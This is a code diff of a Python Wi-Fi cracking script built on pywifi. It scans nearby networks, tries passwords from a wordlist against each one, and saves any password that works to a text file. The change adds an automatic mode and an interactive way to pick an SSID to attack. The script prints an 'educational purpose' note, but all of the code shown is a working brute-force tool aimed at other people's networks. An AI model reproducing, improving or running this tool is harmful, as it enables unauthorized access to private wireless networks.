@@ -1,6 +1,7 @@
 import os
 import platform
 import sys
+
 try:
     import pywifi
 except ModuleNotFoundError:
@@ -56,7 +57,7 @@ clear()
 
 sprint(f"\n\n{r} Note: {c}This tool is only made for educational purpose... -_+")
 sprint(f"\n{g}Preparing...")
-time.sleep(2)
+# time.sleep(2)
 clear()
 banner()
 
@@ -78,6 +79,10 @@ def scan(face):
 
 def main():
     wifi = pywifi.PyWiFi()
+    # interfaces = wifi.interfaces()
+    # for interface in interfaces:
+    #     print(interface)
+    # inface = input("interface:")
     inface = wifi.interfaces()[0]
 
     scanner = scan(inface)
@@ -85,19 +90,37 @@ def main():
     num = len(scanner)
 
     print(f"{r}Number of wifi found: {ran}{str(num)}")
-    input(f"{y}\nPress enter to start___")
-          
-    for i,x in enumerate(scanner):
-        res = test(num-i , inface , x , passwords , ts)
+    # input(f"{y}\nPress enter to start___")
+    scanner_queue = list(scanner)
 
-        if res:
-            print(ran + "="*20)
-            print(f"{r}Password found : {c}{str(res)}\n")
+    if os.environ.get("AUTO"):
+        for i,x in enumerate(scanner_queue):
+            search(num, i, inface, x)
+    else:
+        i = -1
+        while len(scanner_queue):
+            scanner_dict = {}
+            for scanner in scanner_queue:
+                scanner_dict[scanner.ssid.strip()] = scanner
+                print(scanner.ssid.strip())
+            ssid = input("ssid: ")
+            print(ssid)
+            x = scanner_dict[ssid]
+            i += 1
+            search(num, i, inface, x)
 
-            with open("avail_nearby_wifis.txt", "a") as f:
-                f.write(str(res) + "\n")
 
-            print(ran + "="*20)
+def search(num, i, inface, x):
+    res = test(num-i , inface , x , passwords , ts)
+
+    if res:
+        print(ran + "="*20)
+        print(f"{r}Password found : {c}{str(res)}\n")
+
+        with open("avail_nearby_wifis.txt", "a") as f:
+            f.write(str(res) + "\n")
+
+        print(ran + "="*20)
 
 
 def test(i ,face,x,key,ts):
@@ -107,12 +130,11 @@ def test(i ,face,x,key,ts):
         print(f"{r}[!] {y}Password tried -- {str(wifi_name)}\n{g}Password is known!")
         return False
 
-    print(ran + "Trying to connect to wifi "+str(wifi_name))
+    print(ran + "Trying to connect to wifi '"+str(wifi_name)+"'")
 
     for n,password in enumerate(key):
         if wifi_name+"--"+password in found:
             print(r + "Password already found +_+")
-
             continue
         else:
             with open("already_tried_password" , "a") as f:
